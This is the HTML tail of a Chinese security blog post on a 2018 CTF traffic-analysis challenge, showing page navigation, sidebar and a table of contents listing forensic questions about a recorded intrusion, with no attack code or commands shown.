+          <a class="-mob-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.r1ght0us.xyz/2020/05/27/2018西普杯铁三流量分析/&title=2018西普杯铁三流量分析 | R1ght0us's Blog&summary=经典流量分析题目，每次都要拿出来用索性整理好下次方便点">
+            
+              <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qq.png">
+            
+          </a>
+        
+      
+        
+          <a class="-mob-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.r1ght0us.xyz/2020/05/27/2018西普杯铁三流量分析/&title=2018西普杯铁三流量分析 | R1ght0us's Blog&summary=经典流量分析题目，每次都要拿出来用索性整理好下次方便点">
+            
+              <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qzone.png">
+            
+          </a>
+        
+      
+        
+          <a class="qrcode" rel="external nofollow noopener noreferrer" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACq0lEQVR42u3a0W7jMAwEwP7/T+eAew2S7pJS2gLjJ8NxLI0CmAypr6/4ePw/nq88X391//tvvX/a+2ceOPDw8PBGU3915I/Owc/nyYjvv/VydDw8PLxrvNmENsEgHzH59OV1PDw8vB/ltQnxLOFOFggPDw/vr/DyJbidZOPh4eH9Bl5SjEiuJGXfPJDkS3Cg1oKHh4cX89oG2G84v9jfw8PDw1t01U+9fPfBYzhDPDw8vAu8tkHVFlVzRt42q7c14OHh4R3lJaWHtgSwmXq7HN+c4+Hh4V3gJY/Li7BtaXhWus3Tdzw8PLwbvNnwbZCYbZxql7jo7OHh4eFd47UlhrzcsClDFBu88PDw8C7w8u1T+eanfEKzsnKyZN80wPDw8PCu8ZI2f5sQb+5sR8fDw8O7wWsLo3mSvWmAbYJKkfXj4eHhjXg541RLbBaKDgQtPDw8vEO8vBSbfJpTTzXAVik1Hh4e3oi3iSTDwUahKA8kdQMMDw8Pb7R1IGlrtanzDJ/8GkmbDQ8PD++TvFmDvy31bjZjFaUKPDw8vA/ykiHbO2el4XxRhj00PDw8vJKXF3DzALB/9Z8KD3h4eHif4c3+/M/CxqZJ1s4ZDw8P7yxv3+6apbltwXe4ZQEPDw/vAm/WsM8bV4/4yFP8tiCCh4eHd493KsFtt3DNyhkrDB4eHt6CN0ug982zfNxVaMHDw8O7xstf6Kea/bPCbhuW8PDw8M7yHuWxWY68YHHqaXh4eHg3eLMyxGw7VPKt9pn53wA8PDy8s7w8GORN/byt1Z7XgQEPDw/vGm/zom/bVMkStLELDw8P72/xZil4myjPmnB4eHh4P8vLSwOnigt5mHk5Ezw8PLxrvLNJcJ5kz9pvRQqOh4eHd4HXvtDzou1+M9Zm8wEeHh7eBd4/jhMNATtJG48AAAAASUVORK5CYII=">
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/wechat.png">
+          
+          </a>
+        
+      
+        
+          <a class="-mob-share-weibo" title="微博" rel="external nofollow noopener noreferrer" href="http://service.weibo.com/share/share.php?url=http://www.r1ght0us.xyz/2020/05/27/2018西普杯铁三流量分析/&title=2018西普杯铁三流量分析 | R1ght0us's Blog&summary=经典流量分析题目，每次都要拿出来用索性整理好下次方便点">
+            
+              <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/weibo.png">
+            
+          </a>
+        
+      
+    </div>
+  </div>
+
+
+            
+          </section>
+        
+
+        
+            <div class="prev-next">
+                
+                
+                    <section class="next">
+                        <span class="art-item-right" aria-hidden="true">
+                            <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
+                            <h4>
+                                <a href="/2020/02/17/DVWA靶场-常见漏洞原理以及防御/" rel="prev" title="DVWA靶场-常见漏洞原理以及防御">
+                                    
+                                        DVWA靶场-常见漏洞原理以及防御
+                                    
+                                </a>
+                            </h4>
+                            
+                                
+                                <h6 class="tags">
+                                    <a class="tag" href="/tags/DVWA/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>DVWA</a> <a class="tag" href="/tags/基础课件/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>基础课件</a>
+                                </h6>
+                            
+                        </span>
+                    </section>
+                
+            </div>
+        
+
+    </section>
+
+</article>
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+<br>
+
+<!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box comments">
+    <section class="article typo">
+
+      
+        
+
+    <div class="recommended_posts">
+        <h4><i class="fas fa-bookmark fa-fw" aria-hidden="true"></i>&nbsp;相关文章</h4>
+        <ul>
+            
+                <li><a href="http://www.r1ght0us.xyz/2020/02/17/DVWA靶场-常见漏洞原理以及防御/">DVWA靶场-常见漏洞原理以及防御</a></li>
+            
+                <li><a href="http://www.r1ght0us.xyz/2019/06/01/xml基本知识以及XXE漏洞/">xml基本知识以及XXE漏洞</a></li>
+            
+                <li><a href="http://www.r1ght0us.xyz/2019/01/26/flask之数据库/">flask之数据库</a></li>
+            
+                <li><a href="http://www.r1ght0us.xyz/2019/01/24/flask之Web表单/">flask之Web表单</a></li>
+            
+        </ul>
+    </div>
+
+
+      
+
+      
+        <h4><i class="fas fa-comments fa-fw" aria-hidden="true"></i>&nbsp;评论</h4>
+        
+        
+        
+          
+            <section id="comments">
+              <div id="valine_container" class="valine_thread">
+                <i class="fas fa-spinner fa-spin fa-fw"></i>
+              </div>
+            </section>
+          
+        
+      
+    </section>
+  </article>
+
+
+
+<script>
+    window.subData = {
+        title: '2018西普杯铁三流量分析',
+        tools: true
+    }
+</script>
+
+
+        </div>
+        <aside class='l_side'>
+            
+  
+  
+    
+      
+      
+        <section class="author">
+  <div class="content pure">
+    
+      <div class="avatar">
+        <img class="avatar" src="/images/header.png">
+      </div>
+    
+    
+      <div class="text">
+        
+        
+        
+          <p><span id="jinrishici-sentence">R1ght0us's Blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="https://github.com/ssb6666" class="social flat-btn" target="_blank" rel="external"><i class="social fab fa-github" aria-hidden="true"></i></a>
+          
+        
+          
+            <a href="https://blog.csdn.net/qq_39495209" class="social flat-btn" target="_blank" rel="external"><i class="social fas fa-flag" aria-hidden="true"></i></a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+      
+    
+  
+    
+      
+      
+        <section class="plain">
+  
+<header class="pure">
+  <div><i class="fas fa-bullhorn fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;</div>
+  
+</header>
+
+  <div class="content pure">
+    <p>但愿这里能让你获益颇多</p>
+
+  </div>
+</section>
+
+      
+    
+  
+    
+      
+      
+        
+  <section class="category">
+    
+<header class="pure">
+  <div><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;所有分类</div>
+  
+</header>
+
+    <div class="content pure">
+      <ul class="entry">
+        
+          <li><a class="flat-box" title="/categories/CTF/" href="/categories/CTF/"><div class="name">CTF</div><div class="badge">(5)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/XML注入/" href="/categories/XML注入/"><div class="name">XML注入</div><div class="badge">(1)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/hexo/" href="/categories/hexo/"><div class="name">hexo</div><div class="badge">(1)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/python编程/" href="/categories/python编程/"><div class="name">python编程</div><div class="badge">(6)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/靶场/" href="/categories/靶场/"><div class="name">靶场</div><div class="badge">(1)</div></a></li>
+        
+      </ul>
+    </div>
+  </section>
+
+
+      
+    
+  
+    
+      
+      
+        
+  <section class="tagcloud">
+    
+<header class="pure">
+  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;热门标签</div>
+  
+</header>
+
+    <div class="content pure">
+      <a href="/tags/CRYPTO/" style="font-size: 14px; color: #999">CRYPTO</a> <a href="/tags/DVWA/" style="font-size: 14px; color: #999">DVWA</a> <a href="/tags/Git/" style="font-size: 14px; color: #999">Git</a> <a href="/tags/MISC/" style="font-size: 19px; color: #777">MISC</a> <a href="/tags/SQLinjection/" style="font-size: 16.5px; color: #888">SQLinjection</a> <a href="/tags/XML/" style="font-size: 14px; color: #999">XML</a> <a href="/tags/XXE/" style="font-size: 14px; color: #999">XXE</a> <a href="/tags/debug/" style="font-size: 14px; color: #999">debug</a> <a href="/tags/flask/" style="font-size: 21.5px; color: #666">flask</a> <a href="/tags/hexo常见问题/" style="font-size: 14px; color: #999">hexo常见问题</a> <a href="/tags/kali/" style="font-size: 14px; color: #999">kali</a> <a href="/tags/netcat/" style="font-size: 14px; color: #999">netcat</a> <a href="/tags/python/" style="font-size: 24px; color: #555">python</a> <a href="/tags/python3/" style="font-size: 14px; color: #999">python3</a> <a href="/tags/基础课件/" style="font-size: 14px; color: #999">基础课件</a> <a href="/tags/手动注入/" style="font-size: 14px; color: #999">手动注入</a> <a href="/tags/比赛WP/" style="font-size: 14px; color: #999">比赛WP</a> <a href="/tags/比赛wp/" style="font-size: 14px; color: #999">比赛wp</a> <a href="/tags/流量分析/" style="font-size: 14px; color: #999">流量分析</a> <a href="/tags/盲水印/" style="font-size: 14px; color: #999">盲水印</a> <a href="/tags/程序基础/" style="font-size: 14px; color: #999">程序基础</a>
+    </div>
+  </section>
+
+
+      
+    
+  
+    
+      
+      
+        <section class="list">
+  
+<header class="pure">
+  <div><i class="fas fa-link fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;友链</div>
+  
+</header>
+
+  <div class="content pure">
+    <ul class="entry">
+      
+        <li><a class="flat-box" title="http://xjusec.club:886" href="http://xjusec.club:886">
+          <div class="name">
+            
+              <i class="fas fa-external-link-square fa-fw" aria-hidden="true"></i>
+            
+            &nbsp;&nbsp;XJUSEC_CTF
+          </div>
+          
+        </a></li>
+      
+        <li><a class="flat-box" title="https://blog.csdn.net/qq_40648358/" href="https://blog.csdn.net/qq_40648358/">
+          <div class="name">
+            
+              <i class="fas fa-external-link-square fa-fw" aria-hidden="true"></i>
+            
+            &nbsp;&nbsp;RDD_NULL
+          </div>
+          
+        </a></li>
+      
+        <li><a class="flat-box" title="http://www.kittener.top" href="http://www.kittener.top">
+          <div class="name">
+            
+              <i class="fas fa-external-link-square fa-fw" aria-hidden="true"></i>
+            
+            &nbsp;&nbsp;KITTENER
+          </div>
+          
+        </a></li>
+      
+    </ul>
+  </div>
+</section>
+
+      
+    
+  
+    
+      
+      
+        
+  <section class="toc-wrapper">
+    
+<header class="pure">
+  <div><i class="fas fa-list fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;文章目录</div>
+  
+    <div class="wrapper"><a class="s-toc rightBtn" rel="external nofollow noopener noreferrer" href="javascript:void(0)"><i class="fas fa-thumbtack fa-fw"></i></a></div>
+  
+</header>
+
+    <div class="content pure">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#本文所用的WireShark语法"><span class="toc-text">本文所用的WireShark语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#问题"><span class="toc-text">问题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-黑客攻击的第一个受害主机的网卡IP地址"><span class="toc-text">0x01 黑客攻击的第一个受害主机的网卡IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-黑客对URL的哪一个参数实施了SQL注入"><span class="toc-text">0x02 黑客对URL的哪一个参数实施了SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-第一个受害主机网站数据库的表前缀"><span class="toc-text">0x03 第一个受害主机网站数据库的表前缀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-第一个受害主机网站数据库的名字"><span class="toc-text">0x04 第一个受害主机网站数据库的名字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Joomla后台管理员的密码是多少"><span class="toc-text">0x05 Joomla后台管理员的密码是多少</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-黑客第一次获得的php木马的密码是什么"><span class="toc-text">0x06 黑客第一次获得的php木马的密码是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-黑客第二次上传php木马是什么时间"><span class="toc-text">0x07 黑客第二次上传php木马是什么时间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-第二次上传的木马通过HTTP协议中的哪个头传递数据"><span class="toc-text">0x08 第二次上传的木马通过HTTP协议中的哪个头传递数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-内网主机的mysql用户名和请求连接的密码hash是多少"><span class="toc-text">0x09 内网主机的mysql用户名和请求连接的密码hash是多少</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-php代理第一次被使用时最先连接了哪个IP地址"><span class="toc-text">0x10 php代理第一次被使用时最先连接了哪个IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候"><span class="toc-text">0x11 黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-黑客在内网主机中添加的用户名和密码是多少"><span class="toc-text">0x12 黑客在内网主机中添加的用户名和密码是多少</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-黑客从内网服务器中下载下来的文件名"><span class="toc-text">0x13 黑客从内网服务器中下载下来的文件名</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a></li></ol>
+    </div>
+  </section>
+
+
+      
+    
+  
+
+
+        </aside>
+        <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+    </div>
+    <footer id="footer" class="clearfix">
+  
+    <div class="social-wrapper">
+      
+        
+          <a href="https://github.com/ssb6666" class="social fab fa-github flat-btn" target="_blank" rel="external"></a>
+        
+      
+        
+          <a href="https://blog.csdn.net/qq_39495209" class="social fas fa-flag flat-btn" target="_blank" rel="external"></a>
+        
+      
+    </div>
+  
+  <br>
+  <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+  <div>本站使用 <a href="https://xaoxuu.com/wiki/material-x/" target="_blank" class="codename">Material X</a> 作为主题，总访问量为 <span id="busuanzi_value_site_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span> 次。
+  </div>
+</footer>
+
+    <script>setLoadingBarProgress(80);</script>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+
+  <script>
+    var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+    var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+    var ALGOLIA_API_KEY = "";
+    var ALGOLIA_APP_ID = "";
+    var ALGOLIA_INDEX_NAME = "";
+    var AZURE_SERVICE_NAME = "";
+    var AZURE_INDEX_NAME = "";
+    var AZURE_QUERY_KEY = "";
+    var BAIDU_API_ID = "";
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/"||"/";
+    if(!ROOT.endsWith('/'))ROOT += '/';
+  </script>
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.5/dist/scrollreveal.min.js"></script>
+    <script type="text/javascript">
+      $(function() {
+        const $reveal = $('.reveal');
+    		if ($reveal.length === 0) return;
+    		const sr = ScrollReveal({ distance: 0 });
+    		sr.reveal('.reveal');
+      });
+    </script>
+  
+  
+    <script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+    <script type="text/javascript">
+      $(function() {
+        Waves.attach('.flat-btn', ['waves-button']);
+        Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+        Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+        Waves.attach('.flat-box', ['waves-block']);
+        Waves.attach('.float-box', ['waves-block', 'waves-float']);
+        Waves.attach('.waves-image');
+        Waves.init();
+      });
+    </script>
+  
+  
+    <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+  
+  
+  
+
+
+  
+  
+  
+    
+      
+      
+      
+        
+          <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+          
+            
+              <script src="https://cdn.jsdelivr.net/gh/xaoxuu/volantis@1/js/volantis.min.js"></script>
+            
+          
+          <script>
+          var GUEST_INFO = ['nick','mail','link'];
+          var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+            return GUEST_INFO.indexOf(item) > -1
+          });
+          var notify = 'false' == true;
+          var verify = 'false' == true;
+          var valine = new Valine();
+          valine.init({
+            el: '#valine_container',
+            notify: notify,
+            verify: verify,
+            guest_info: guest_info,
+            
+            appId: "oss58Ms641c57OCAYSuXAwDF-MdYXbMMI",
+            appKey: "oNW9OxduWTRga9cS7i1PL8Jt",
+            placeholder: "交流使人进步",
+            pageSize:'10',
+            avatar:'monsterid',
+            lang:'zh-cn',
+            highlight:''
+          })
+          </script>
+        
+      
+    
+  
+  
+    <script src="/js/app.js"></script>
+<script src="/js/search.js"></script>
+  
+
+
+
+
+
+
+    <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
